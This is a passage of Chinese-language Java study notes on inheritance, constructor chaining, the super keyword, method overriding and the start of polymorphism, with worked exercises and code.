class="hljs-string">&quot;大头儿子&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220916223800253.png" alt="image-20220916223800253"></p><p><strong>Q</strong>:<code>System.out.println(son.name);</code>输出的是谁的name</p><p><strong>A</strong>:要按照查找关系来返回信息</p><ol><li>首先看子类是否有该属性</li><li>如果子类有这个属性，并且可以访问（例如，若私有，可能不能访问），则返回信息</li><li>如果子类没有这个属性，就看父类有没有这个属性（如果父类有该属性，并且可以访问，就返回信息）</li><li>如果父类没有这个属性，就按照3的规则继续找上级父类，直到Object。</li></ol><p>所以下面三条语句返回的是：“大头儿子”，39和“旅游”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(son.name);<br>System.out.println(son.age);<br>System.out.println(son.hobby);<br></code></pre></td></tr></table></figure><h3 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h3><blockquote><p> ／／放在 com.hspedu.extend.exercise 包下<br>1． 案例1 ExtendsExercise01.java<br>class A{<br>A(){ System.out.println(“a”); }<br>A(String name) {System.out.println(“a name”);} </p><p>class B extends A{<br>B(){ this(“abc”); System.out.println(“b”);}<br>B(String name){System.out.println(“b name”);}</p><p>main函数中：B b＝new B（）；会输出什么？</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.extend_.exercise;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExtendsExercise01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    A()&#123;<br>        System.out.println(<span class="hljs-string">&quot;a&quot;</span>);<br>    &#125;<br>    A(String name) &#123;<br>        System.out.println(<span class="hljs-string">&quot;a.name&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    B()&#123;<br>        <span class="hljs-built_in">this</span>(<span class="hljs-string">&quot;abc&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;b&quot;</span>);<br>    &#125;<br>    B(String name)&#123;<br>        System.out.println(<span class="hljs-string">&quot;b.name&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>答案：a, b.name, b</strong></p><p>调用B类先把继承的A类初始化。</p><p>在    <code>B(String name)&#123; System.out.println(&quot;b.name&quot;);&#125;</code>前默认有super();</p><p>所以最先输出<code>a</code>.</p><p>然后再输出<code>b.name</code></p><p>然后再回到B的无参构造器，输出<code>b</code>.（因为B的无参构造器有this，所以没有super）</p><blockquote><p>2.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;我是A类&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">B</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;我是B类的无参构造&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">B</span><span class="hljs-params">(String name)</span>&#123;<br>        System.out.println(name+<span class="hljs-string">&quot;我是B类的有参构造&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">C</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;我是C类的无参构造&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">C</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;hahah&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;我是C类的有参构造&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>mian方法中：C c &#x3D; new C();</p><p>输出么内容？</p></blockquote><p>输出：</p><p>我是A类。</p><p>hahah我是B类的有参构造。（super(“hahah”)）</p><p>我是C类的有参构造。</p><p>我是C类的无参构造。</p><blockquote><p>3.</p><p>编写Computer类，包含CPU、内存、硬盘等属性，getDetails方法用于返回Computer的详细信息<br>编写PC子类，继承Computer类，添加特有属性【品牌brand】<br>编写NotePad子类，继承Computer类，添加特有属性【演示color】<br>编写Test类，在main方法中创建PC和NotePad对象，分别给对象中特有的属性赋值，以及从Computer类继承的属性赋值，并使用方法并打印输出信息。</p></blockquote><p>Computer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.extend_.exercise;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Computer</span> &#123;<br>    <span class="hljs-keyword">private</span> String CPU;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> memory;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> disk;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Computer</span><span class="hljs-params">(String CPU, <span class="hljs-type">int</span> memory, <span class="hljs-type">int</span> disk)</span> &#123;<br>        <span class="hljs-built_in">this</span>.CPU = CPU;<br>        <span class="hljs-built_in">this</span>.memory = memory;<br>        <span class="hljs-built_in">this</span>.disk = disk;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCPU</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> CPU;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCPU</span><span class="hljs-params">(String CPU)</span> &#123;<br>        <span class="hljs-built_in">this</span>.CPU = CPU;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getMemory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> memory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMemory</span><span class="hljs-params">(<span class="hljs-type">int</span> memory)</span> &#123;<br>        <span class="hljs-built_in">this</span>.memory = memory;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDisk</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> disk;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDisk</span><span class="hljs-params">(<span class="hljs-type">int</span> disk)</span> &#123;<br>        <span class="hljs-built_in">this</span>.disk = disk;<br>    &#125;<br><br>    <span class="hljs-comment">//返回computer的信息</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDetails</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;cpu=&quot;</span> + CPU + <span class="hljs-string">&quot; memory=&quot;</span> + memory + <span class="hljs-string">&quot; disk=&quot;</span> + disk;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PC.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.extend_.exercise;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PC</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Computer</span> &#123;<br>    <span class="hljs-keyword">private</span> String brand;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PC</span><span class="hljs-params">(String CPU, <span class="hljs-type">int</span> memory, <span class="hljs-type">int</span> disk, String brand)</span> &#123;<br>        <span class="hljs-built_in">super</span>(CPU, memory, disk);<br>        <span class="hljs-built_in">this</span>.brand = brand;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getBrand</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> brand;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBrand</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.brand = brand;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;PC信息=&quot;</span>);<br>        <span class="hljs-comment">//调用父类的getDetails</span><br>        System.out.println(getDetails()+<span class="hljs-string">&quot; brand=&quot;</span>+brand);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Notepad.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.extend_.exercise;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NotePad</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Computer</span>&#123;<br>    <span class="hljs-keyword">private</span> String color;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NotePad</span><span class="hljs-params">(String CPU, <span class="hljs-type">int</span> memory, <span class="hljs-type">int</span> disk, String color)</span> &#123;<br>        <span class="hljs-built_in">super</span>(CPU, memory, disk);<br>        <span class="hljs-built_in">this</span>.color = color;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getColor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> color;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setColor</span><span class="hljs-params">(String color)</span> &#123;<br>        <span class="hljs-built_in">this</span>.color = color;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;PC信息=&quot;</span>);<br>        <span class="hljs-comment">//调用父类的getDetails</span><br>        System.out.println(getDetails()+<span class="hljs-string">&quot; color=&quot;</span>+color);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PC</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PC</span>(<span class="hljs-string">&quot;intel&quot;</span>, <span class="hljs-number">16</span>, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;IBM&quot;</span>);<br>pc.printInfo();<br><span class="hljs-type">NotePad</span> <span class="hljs-variable">notepad</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotePad</span>(<span class="hljs-string">&quot;ADM&quot;</span>,<span class="hljs-number">32</span>,<span class="hljs-number">1000</span>,<span class="hljs-string">&quot;white&quot;</span>);<br>notepad.printInfo();<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220917001514615.png" alt="image-20220917001514615" style="zoom:50%;" /><h2 id="6-super关键字"><a href="#6-super关键字" class="headerlink" title="6.super关键字"></a>6.super关键字</h2><p>super代表父类的引用，用于访问父类的属性、方法、构造器。</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ol><li><p>访问父类的属性，不能访问父类的private属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.属性名<br></code></pre></td></tr></table></figure></li><li><p>访问父类的方法，不能访问父类的private方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.方法名(参数列表)<br></code></pre></td></tr></table></figure></li><li><p>访问父类的构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>(参数列表); <span class="hljs-comment">//只能放在构造器的第一句，只能出现一句</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li>分工明确（父类属性由父类初始化，子类的属性由子类初始化）</li><li>当子类中有和父类中的成员（属性和方法）重名时，为了访问父类的成员，必须通过super。如果没有重名，使用super、this、直接访问是一样的效果。<ul><li>继承A类的B类里的调用cal().<ol><li>cal()  —— 从子类开始找，再到父类，再往上</li><li>this.cal() —— 等同于cal()</li><li>super.cal() —— 顺序是直接在父类找cal，其他的规则一样</li></ol></li></ul></li><li>super的访问不限于直接父类，如果爷爷类和本类中有同名的成员，也可以使用<br>super去访问爷爷类的成员；如果多个基类中都有同名的成员，使用super访问遵循就近原则。A-＞B-＞C</li></ol><h3 id="super和this的比较"><a href="#super和this的比较" class="headerlink" title="super和this的比较"></a>super和this的比较</h3><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220917155734759.png" alt="image-20220917155734759"></p><h2 id="7-方法重写-x2F-覆盖（override）"><a href="#7-方法重写-x2F-覆盖（override）" class="headerlink" title="7.方法重写&#x2F;覆盖（override）"></a>7.方法重写&#x2F;覆盖（override）</h2><p>简单的说：方法覆盖（重写）就是子类有一个方法，和父类的某个方法的名称、返回类型、参数一样，那么我们就说子类的这个方法覆盖了父类的方法。</p><p>案例：</p><p>Animal.java（父类）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.override;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cry</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;动物叫唤..&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Dog.java（子类）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.override;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span>&#123;<br>    <span class="hljs-comment">//1.Dog 是Animal的子类</span><br>    <span class="hljs-comment">//2.Dog的cry方法和Animal的cry方法定义形式一样</span><br>    <span class="hljs-comment">//3.这时我们就说Dog的cry方法，重写了Animal的cry方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cry</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;小狗汪汪！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Override01.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.override;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Override01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Dog</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br>        dog.cry();<br>    &#125;&#125;<br></code></pre></td></tr></table></figure><p>输出：小狗汪汪！</p><h3 id="细节-1"><a href="#细节-1" class="headerlink" title="细节"></a>细节</h3><p>需要满足的条件：</p><ol><li>子类的方法的<strong>参数、方法名称</strong>，要和父类方法的参数，方法名称完全一样。</li><li>子类方法的返回类型和父类方法的返回类型一样，或者是父类返回类型的子类。<ul><li>例如：父类返回类型是OBject，子类返回类型是String。因为String是Object的子类，所以可以。</li></ul></li><li>子类不能缩小父类方法的访问权限。<ul><li>public &gt; protected &gt; 默认 &gt; private</li></ul></li></ol><h3 id="重写和重载的区别"><a href="#重写和重载的区别" class="headerlink" title="重写和重载的区别"></a>重写和重载的区别</h3><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220917164017834.png" alt="image-20220917164017834"></p><h3 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h3><blockquote><p>1.编写一个Person类，包括属性／private（name、age），构造器、方法say（返回自我介绍的字符串）。</p><p>2.编写一个Student类，继承Person类，增加id、score属性／private，以及构造器，定义say方法（返回自我介绍的信息）。<br>3.在main中，分别创建Person和Student对象，调用say方法输出自我介绍。</p></blockquote><p> Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.override;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-comment">//返回自我介绍的字符串</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我的名字叫：&quot;</span>+name+<span class="hljs-string">&quot;，年龄为&quot;</span>+age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Student.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.override;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> score;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, <span class="hljs-type">int</span> id, <span class="hljs-type">double</span> score)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name, age);<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.score = score;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//这里super的好处，代码复用</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.say()+<span class="hljs-string">&quot;,id为&quot;</span>+id+<span class="hljs-string">&quot;，score为：&quot;</span>+score;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getScore</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> score;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setScore</span><span class="hljs-params">(<span class="hljs-type">double</span> score)</span> &#123;<br>        <span class="hljs-built_in">this</span>.score = score;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>OverrideExercise.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.override;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OverrideExercise</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">jack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">21</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">alice</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">21</span>, <span class="hljs-number">10000</span>, <span class="hljs-number">200</span>);<br>        System.out.println(jack.say());<br>        System.out.println(alice.say());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220917165611250.png" alt="image-20220917165611250"></p><h2 id="8-多态"><a href="#8-多态" class="headerlink" title="8.多态"></a>8.多态</h2><p>（多态可以提高代码的复用性，更利于代码的维护。）</p><p>多态指同一个事物或行为具有多个不同的表现形式或结果。</p><p>体现在面向对象编程中，为<strong>同一个方法调用通过不同的对象完成不同的功能。</strong></p><p><strong>方法或对象具有多种形态</strong>。是面向对象的第三大特征，多态是建立在封装和继承基础之上。</p><h3 id="方法的多态"><a href="#方法的多态" class="headerlink" title="方法的多态"></a>方法的多态</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PolyMethod</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> 